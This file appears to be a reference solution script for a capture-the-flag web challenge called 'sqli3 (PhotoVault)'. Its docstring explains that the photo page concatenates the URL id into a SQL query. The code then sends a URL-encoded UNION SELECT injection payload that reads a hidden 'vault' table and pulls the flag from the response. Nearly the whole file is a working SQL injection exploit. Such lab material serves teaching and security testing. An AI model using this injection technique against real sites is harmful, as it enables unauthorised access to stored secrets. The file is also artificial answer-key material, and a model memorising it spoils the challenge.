#!/usr/bin/env python3
"""Reference solve for sqli3 (PhotoVault).

The photo detail page builds its query by concatenating the id from the
URL:

    SELECT id, src, title, caption FROM photos WHERE id = <pid>

A UNION payload appends rows from the hidden vault table:

    /photo/0 UNION SELECT 1, item, 3, secret FROM vault--

The vault row is rendered like a normal photo, and the flag comes back in
its caption.

    python solve.py                 # localhost:8032
    python solve.py http://host:8032
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8032")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PAYLOAD = "/photo/0%20UNION%20SELECT%201%2Citem%2C3%2Csecret%20FROM%20vault--"


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)

    try:
        r = s.get(BASE + PAYLOAD, timeout=10)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
